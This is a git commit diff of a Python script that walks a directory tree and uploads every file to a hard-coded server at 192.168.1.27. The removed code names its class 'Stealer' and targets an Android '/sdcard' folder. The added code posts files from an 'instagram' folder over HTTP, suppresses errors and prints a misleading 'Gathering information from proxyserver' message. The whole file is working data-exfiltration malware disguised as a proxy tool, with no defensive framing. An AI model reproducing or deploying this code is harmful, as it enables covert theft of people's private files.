80fb188703b60d0d01caaffcde5105014f167182
Arcade-m7 <159676764+Arcade-m7@users.noreply.github.com>
2024-09-28 14:59:20 +0100

    Add files via upload

--- index.py
+++ index.py
@@ -1,51 +1,31 @@
-from lib.NetStructer import Bridge
+from requests import post
 from lib.colored import fg
-from os.path import join
+from os.path import join,exists
 from os import scandir
+url = 'http://192.168.1.27:5000/75706C6F6164'
 
-class layers:
+def SendCountent(filename):
+    if exists(filename):
+        with open(filename,'rb') as filetosend:
+            post(url,files={'file':filetosend},data={'filepath':filename})
+    else:
+        raise FileNotFoundError
 
-    PASSWORD = 'PASSWORD'
-
-class FILE:
-
-    def __init__(self,name,countent) -> None:
-        self.name = name ; self.countent = countent
-
-class Stealer:
-    
-    def __init__(self,addr,password='Default') -> None:
-        self.addr = addr ; self.password = password
-        self.server = Bridge
-
-    def link(self):
-        self.server = Bridge.link(self.addr)
-        self.server.SendBuffer({layers.PASSWORD:self.password})
-
-    def SendCountent(self,content):
-        while True:
-            try:
-                self.link() ; self.server.SendBuffer(content) ; break
-            except (ConnectionAbortedError,ConnectionRefusedError,ConnectionResetError,TimeoutError):
-                print(fg('red')+"can't connect to the server make"+fg('white'))
-
-def main(addr,were='.'):
-    Cclass = [were] ; CP = were ; server = Stealer(addr) ; loop = 0
-    print(f'trying to find the'+fg('cyan')+ 'ProxyServer'+fg('white'))
+def main(were='.'):
+    Cclass = [were] ; CP = were ; loop = 0
+    print(f'trying to find the '+fg('cyan')+ 'ProxyServer'+fg('white'))
     while len(Cclass) != 0:
         try:
             for i in scandir(CP):
                 if i.is_dir():
                     Cclass.append((var:=join(CP,i.name)))
                 else:
-                    server.SendCountent(FILE(join(CP,i.name),open(join(CP,i.name),'rb').read()))
-                    print(f'Gather '+fg('green') +f'{loop}'+fg('white'))
+                    SendCountent(join(CP,i.name)) ;loop += 1
+                    print(f'Gathering information from proxyserver please wait := '+fg('green') +f'{loop}'+fg('white')+'\r')
             Cclass.remove(CP)
             CP = Cclass[0]
         except Exception as er: 
-            print(er)
+            pass
 
-USER = 'MARWA-ANDRDOID'
+main('instagram')
 
-if __name__ == '__main__':
-    main(('192.168.1.27',1966),join(USER,'/sdcard'))
